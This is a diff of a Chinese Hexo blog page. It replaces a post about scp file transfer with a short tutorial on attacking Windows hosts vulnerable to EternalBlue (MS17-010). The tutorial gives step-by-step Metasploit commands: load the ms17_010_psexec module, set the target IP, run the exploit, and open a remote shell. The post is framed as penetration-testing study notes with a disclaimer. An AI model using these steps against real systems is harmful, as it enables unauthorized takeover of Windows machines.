@@ -50,19 +50,20 @@
   };
 </script>
 
-  <meta name="description" content="前言在局域网安装了一台 CentOS 的服务器，想从服务器上下载文件到本机（MacOS）">
+  <meta name="description" content="前言永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445&#x2F;TCP端口的档案分享协议的漏洞进行散播。维基百科">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【踩坑】从本机到服务器的文件传输（CentOS篇）">
-<meta property="og:url" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;2019&#x2F;11&#x2F;13&#x2F;%E4%BB%8E%E6%9C%AC%E6%9C%BA%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93&#x2F;index.html">
+<meta property="og:title" content="【笔记】攻击具有 永恒之蓝 漏洞的Windows">
+<meta property="og:url" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;2019&#x2F;11&#x2F;16&#x2F;%E6%94%BB%E5%87%BB%E5%85%B7%E6%9C%89-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E6%BC%8F%E6%B4%9E%E7%9A%84Windows&#x2F;index.html">
 <meta property="og:site_name" content="绯鞠的博客">
-<meta property="og:description" content="前言在局域网安装了一台 CentOS 的服务器，想从服务器上下载文件到本机（MacOS）">
+<meta property="og:description" content="前言永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445&#x2F;TCP端口的档案分享协议的漏洞进行散播。维基百科">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;images&#x2F;20191113133100&#x2F;01.png">
-<meta property="og:updated_time" content="2019-11-13T06:28:34.634Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;images&#x2F;20191116171428&#x2F;01.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;images&#x2F;20191116171428&#x2F;02.png">
+<meta property="og:updated_time" content="2019-11-16T09:49:18.862Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;images&#x2F;20191113133100&#x2F;01.png">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;feiju12138.github.io&#x2F;images&#x2F;20191116171428&#x2F;01.png">
 
-<link rel="canonical" href="https://feiju12138.github.io/2019/11/13/%E4%BB%8E%E6%9C%AC%E6%9C%BA%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">
+<link rel="canonical" href="https://feiju12138.github.io/2019/11/16/%E6%94%BB%E5%87%BB%E5%85%B7%E6%9C%89-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E6%BC%8F%E6%B4%9E%E7%9A%84Windows/">
 
 
 <script id="page-configurations">
@@ -76,7 +77,7 @@
   };
 </script>
 
-  <title>【踩坑】从本机到服务器的文件传输（CentOS篇） | 绯鞠的博客</title>
+  <title>【笔记】攻击具有 永恒之蓝 漏洞的Windows | 绯鞠的博客</title>
   
 
 
@@ -195,7 +196,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://feiju12138.github.io/2019/11/13/%E4%BB%8E%E6%9C%AC%E6%9C%BA%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">
+    <link itemprop="mainEntityOfPage" href="https://feiju12138.github.io/2019/11/16/%E6%94%BB%E5%87%BB%E5%85%B7%E6%9C%89-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E6%BC%8F%E6%B4%9E%E7%9A%84Windows/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -208,7 +209,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          【踩坑】从本机到服务器的文件传输（CentOS篇）
+          【笔记】攻击具有 永恒之蓝 漏洞的Windows
         </h1>
 
         <div class="post-meta">
@@ -219,7 +220,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2019-11-13 13:31:00 / 修改时间：14:28:34" itemprop="dateCreated datePublished" datetime="2019-11-13T13:31:00+08:00">2019-11-13</time>
+              <time title="创建时间：2019-11-16 17:14:28 / 修改时间：17:49:18" itemprop="dateCreated datePublished" datetime="2019-11-16T17:14:28+08:00">2019-11-16</time>
             </span>
 
           
@@ -233,33 +234,55 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在局域网安装了一台 CentOS 的服务器，想从服务器上下载文件到本机（MacOS）</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445/TCP端口的档案分享协议的漏洞进行散播。<a href="https://wikipedia.hk.wjbk.site/zh-hans/永恒之蓝" target="_blank" rel="noopener">维基百科</a></p>
 <a id="more"></a>
 
-<h2 id="在本机打开终端"><a href="#在本机打开终端" class="headerlink" title="在本机打开终端"></a>在本机打开终端</h2><ul>
-<li>访达-&gt;应用程序-&gt;实用工具-&gt;终端</li>
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p><font color="#FF0000">本文章仅用于网络安全渗透测试学习，请勿用于其他用途</font></p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
+<li><p>安装并配置好的 Metasploit Framework</p>
+</li>
+<li><p>一台有”永恒之蓝”漏洞的Windows电脑</p>
+</li>
 </ul>
-<p><img src="/images/20191113133100/01.png" alt="01.png"></p>
-<h2 id="使用”scp”工具进行文件下载"><a href="#使用”scp”工具进行文件下载" class="headerlink" title="使用”scp”工具进行文件下载"></a>使用”scp”工具进行文件下载</h2><h3 id="开始下载"><a href="#开始下载" class="headerlink" title="开始下载"></a>开始下载</h3><ul>
-<li>以”linux”用户身份，登录服务器”192.168.1.216”，将”图片”目录下的”01.png”，下载到本地的”下载”目录</li>
+<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><ul>
+<li><p>由于本文为测试，所以默认已知被攻击的电脑ip为”192.169.1.1”</p>
+</li>
+<li><p>启动 Metasploit Framework</p>
+</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp linux@192.168.1.216:/home/linux/图片/01.png ~/Downloads/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20191116171428/01.png" alt="01.png"></p>
+<ul>
+<li>查看攻击永恒之蓝漏洞的工具</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>输入服务器密码</li>
+<li>使用其中一款工具，输入”y”确认</li>
 </ul>
-<h3 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h3><h2 id="使用”scp”工具进行文件上传"><a href="#使用”scp”工具进行文件上传" class="headerlink" title="使用”scp”工具进行文件上传"></a>使用”scp”工具进行文件上传</h2><h3 id="开始上传"><a href="#开始上传" class="headerlink" title="开始上传"></a>开始上传</h3><ul>
-<li>将本机”下载”目录的”02.png”，上传到以用户身份为”linux”，登录的服务器”192.168.1.216”，的”图片”目录</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20191116171428/02.png" alt="02.png"></p>
+<ul>
+<li>设置目标ip</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp ~/Downloads/02.png linux@192.168.1.216:/home/linux/图片/</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.1.1</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>输入服务器密码</li>
+<li>开始攻击</li>
 </ul>
-<h3 id="完成-1"><a href="#完成-1" class="headerlink" title="完成"></a>完成</h3><h2 id="使用”scp”进行文件夹传输"><a href="#使用”scp”进行文件夹传输" class="headerlink" title="使用”scp”进行文件夹传输"></a>使用”scp”进行文件夹传输</h2><ul>
-<li>将命令加上”-r”参数即可</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果攻击成功，即可获得控制权</li>
 </ul>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/xiaoyangsavvy/article/details/80195136" target="_blank" rel="noopener">CSDN——xiaoyangsavvy</a></p>
+<h2 id="取得Shell"><a href="#取得Shell" class="headerlink" title="取得Shell"></a>取得Shell</h2><ul>
+<li>取得shell后，即可在目标电脑执行命令行操作</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://zhuanlan.zhihu.com/p/35793142" target="_blank" rel="noopener">知乎——周毅刚</a></p>
 
     </div>
 
@@ -294,17 +317,14 @@
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
-                <a href="/2019/11/13/Linux-%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C/" rel="next" title="【踩坑】Linux 开机自动连接网络（CentOS篇）">
-                  <i class="fa fa-chevron-left"></i> 【踩坑】Linux 开机自动连接网络（CentOS篇）
+                <a href="/2019/11/16/%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit-Framework/" rel="next" title="【笔记】安装配置 Metasploit Framework">
+                  <i class="fa fa-chevron-left"></i> 【笔记】安装配置 Metasploit Framework
                 </a>
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/2019/11/13/tar%E5%91%BD%E4%BB%A4%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B/" rel="prev" title="【笔记】tar命令压缩与解压">
-                  【笔记】tar命令压缩与解压 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
       </footer>
@@ -349,7 +369,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在本机打开终端"><span class="nav-number">2.</span> <span class="nav-text">在本机打开终端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用”scp”工具进行文件下载"><span class="nav-number">3.</span> <span class="nav-text">使用”scp”工具进行文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开始下载"><span class="nav-number">3.1.</span> <span class="nav-text">开始下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完成"><span class="nav-number">3.2.</span> <span class="nav-text">完成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用”scp”工具进行文件上传"><span class="nav-number">4.</span> <span class="nav-text">使用”scp”工具进行文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开始上传"><span class="nav-number">4.1.</span> <span class="nav-text">开始上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完成-1"><span class="nav-number">4.2.</span> <span class="nav-text">完成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用”scp”进行文件夹传输"><span class="nav-number">5.</span> <span class="nav-text">使用”scp”进行文件夹传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文献"><span class="nav-number">6.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#声明"><span class="nav-number">2.</span> <span class="nav-text">声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#准备工作"><span class="nav-number">3.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始攻击"><span class="nav-number">4.</span> <span class="nav-text">开始攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取得Shell"><span class="nav-number">5.</span> <span class="nav-text">取得Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完成"><span class="nav-number">6.</span> <span class="nav-text">完成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文献"><span class="nav-number">7.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
